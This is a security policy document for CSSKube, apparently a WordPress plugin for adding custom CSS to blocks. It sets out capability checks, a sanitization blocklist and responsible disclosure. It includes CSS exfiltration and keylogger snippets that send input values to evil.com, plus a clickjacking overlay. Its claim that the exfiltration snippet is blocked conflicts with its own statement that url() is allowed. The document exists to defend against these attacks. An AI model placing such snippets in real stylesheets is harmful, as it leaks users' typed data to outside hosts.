# Security

## Overview

CSSKube allows trusted users to add custom CSS to WordPress blocks. This document outlines the security measures implemented and best practices for using the plugin safely.

## Security Measures

### 1. Capability Checks

**Requirement:** Only users with the `unfiltered_html` capability can use custom CSS features.

By default, this capability is granted to:
- **Administrators** on single-site installations
- **Super Admins** on multisite installations

**Why this capability?** The `unfiltered_html` capability is WordPress's standard for allowing users to add potentially dangerous content like HTML, CSS, and JavaScript. If a user can already add custom HTML, they can add custom CSS.

**Customization:** You can change the required capability using a filter:

```php
add_filter( 'csskube_required_capability', function() {
    return 'edit_theme_options'; // Example: allow editors to use CSS
});
```

**Important:** Be cautious when lowering the capability requirement, as CSS can be used maliciously.

### 2. CSS Sanitization

All CSS input is sanitized before being rendered on the frontend to prevent various attack vectors:

#### Removed/Blocked Elements:
- **HTML tags** - Stripped completely
- **JavaScript protocols** - `javascript:`, `vbscript:`, `data:text/html`
- **Script tags** - Any `<script>` tags are removed
- **@import statements** - Prevents loading external stylesheets
- **CSS expressions** - `expression()` (IE-specific JavaScript execution)
- **behavior property** - IE-specific that can load malicious code
- **-moz-binding** - Firefox-specific that can execute code

#### Output Escaping:
- All CSS is passed through `wp_kses()` before output
- Block IDs are escaped with `esc_attr()`
- CSS content is sanitized and escaped separately

### 3. Data Storage

- CSS is stored as block attributes in post content
- WordPress's native REST API security handles save operations
- No direct database queries - uses WordPress's block saving mechanism
- Nonces and authentication handled by WordPress core

## Potential Security Concerns

### 1. CSS-Based Attacks

Even with sanitization, CSS can potentially be used for:

#### Data Exfiltration
Malicious CSS can read and exfiltrate sensitive data using attribute selectors and background URLs:

```css
/* Example of malicious CSS (blocked by plugin) */
input[value^="secret"] {
    background: url(https://evil.com/?data=secret);
}
```

**Mitigation:** Ensure only trusted users have access. The `unfiltered_html` capability is required for this reason.

#### UI Redress (Clickjacking)
CSS can overlay elements to trick users:

```css
/* Example of UI redress */
.admin-button {
    position: fixed;
    top: -9999px;
}
.fake-button {
    position: fixed;
    top: 10px;
}
```

**Mitigation:** Only trusted administrators should have access to custom CSS.

#### Keylogger via CSS
CSS can track keypresses using attribute selectors (limited effectiveness):

```css
/* Tracks when specific characters are typed */
input[value$="a"] { background: url(https://evil.com/?key=a); }
```

**Mitigation:** Capability restrictions and user trust model.

### 2. Resource Consumption

Large or complex CSS can cause performance issues:

```css
/* Computationally expensive */
* * * * * * * * { color: red; }
```

**Mitigation:** Trust model - administrators are trusted not to create performance issues.

### 3. External Resources

While `@import` is blocked, CSS can still reference external resources via `url()`:

```css
background: url(https://external-site.com/image.png);
font-face: url(https://fonts.example.com/font.woff);
```

**Note:** This is intentionally allowed as it's a legitimate CSS feature. However, be aware it can:
- Leak information to third parties
- Load potentially large files
- Track users

**Mitigation:** Only allow trusted users to add custom CSS.

## Best Practices

### For Site Administrators

1. **Trust Your Users**: Only grant `unfiltered_html` capability to users you fully trust
2. **Regular Audits**: Periodically review posts/pages with custom CSS
3. **Backups**: Maintain regular backups before making CSS changes
4. **Testing**: Test CSS changes in a staging environment first
5. **Documentation**: Document any custom CSS for future reference

### For Plugin Developers

If you're extending or modifying CSSKube:

1. **Never Remove Sanitization**: The `sanitize_css()` function is critical
2. **Maintain Capability Checks**: Always verify user capabilities
3. **Escape Output**: Use WordPress escaping functions consistently
4. **Test Security**: Test with various CSS injection attempts
5. **Report Issues**: Report security vulnerabilities responsibly

### For Theme Developers

1. **CSP Headers**: Consider implementing Content Security Policy headers
2. **iframe Sandboxing**: Be cautious with iframe implementations
3. **Input Validation**: Add additional validation if needed

## Responsible Disclosure

If you discover a security vulnerability in CSSKube, please report it responsibly:

1. **Do not** create a public GitHub issue
2. Contact Cozmoslabs directly with details
3. Allow time for a fix before public disclosure
4. We will credit you in the security advisory (if desired)

## Compliance

### GDPR Considerations

- CSS can load external resources (fonts, images) which may track users
- If using external resources, update your privacy policy
- Consider using local resources instead of CDN-hosted assets

### Accessibility

- Ensure custom CSS doesn't create accessibility issues
- Test with screen readers and keyboard navigation
- Follow WCAG guidelines

## WordPress Security Standards

CSSKube follows WordPress security best practices:

- ✅ Escaping all output
- ✅ Sanitizing all input
- ✅ Using WordPress nonces (via core block editor)
- ✅ Capability checks for sensitive operations
- ✅ Using WordPress's built-in functions
- ✅ No direct database queries
- ✅ Proper use of WordPress hooks and filters

## Version History

### 1.1.0 (Security Release)
- Added capability checks (`unfiltered_html` required)
- Implemented comprehensive CSS sanitization
- Added output escaping with `wp_kses()`
- Blocked dangerous CSS properties and functions
- Added security documentation

### 1.0.x
- Initial releases
- Basic CSS functionality
- Limited sanitization

## Security Testing

To test the security of your CSSKube installation:

1. **Test Capability Checks**: Try accessing CSS panel as Editor/Author
2. **Test Sanitization**: Attempt to inject malicious CSS
3. **Test XSS**: Try adding `<script>` tags in CSS
4. **Test @import**: Try importing external stylesheets
5. **Review Output**: Inspect HTML source for proper escaping

## Additional Resources

- [WordPress Security Handbook](https://developer.wordpress.org/plugins/security/)
- [OWASP CSS Security](https://owasp.org/www-community/attacks/CSS_Injection)
- [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)

## Questions?

For security-related questions, contact Cozmoslabs.
